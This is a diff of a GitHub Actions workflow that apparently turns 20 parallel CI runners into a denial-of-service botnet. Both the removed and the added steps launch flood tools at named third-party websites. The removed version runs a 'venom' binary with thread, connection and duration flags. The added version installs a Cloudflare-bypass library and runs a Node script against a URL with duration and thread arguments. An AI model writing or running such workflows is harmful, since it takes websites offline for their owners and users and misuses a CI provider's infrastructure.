@@ -1,28 +1,30 @@
-name: Parallel Pipeline
-
+name: Run Parallel Jobs
 on:
-  workflow_dispatch:
-
-permissions:
-  contents: read
-  actions: write
+  workflow_dispatch:  # Allows manual triggering
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
 
 jobs:
-  parallel-job:
-    runs-on: ubuntu-latest
+  run-k-script:
+    runs-on: macos-latest  # Changed to macOS
     strategy:
       matrix:
-        job-number: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]  # 20 parallel jobs
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v3
-
-      - name: Install taskset
-        run: sudo apt-get update && sudo apt-get install -y util-linux
-
-      - name: Make venom executable and run on 4 cores
+      - name: Checkout code
+        uses: actions/checkout@v4
+        
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '18'
+          
+      - name: Install dependencies
         run: |
-          chmod +x ./venom
-          echo "Number of cores available:"
-          nproc
-          ./venom -t900 -c10000 -d10m https://fastyl.net/
+          npm install cloudscraper request randomstring
+          
+      - name: Run Node script
+        run: |
+          node m.js https://rapidis.gay/7778079525-acf93beb-eaa2-4828-9bb9-03e1f49cb04c 300 4 h1
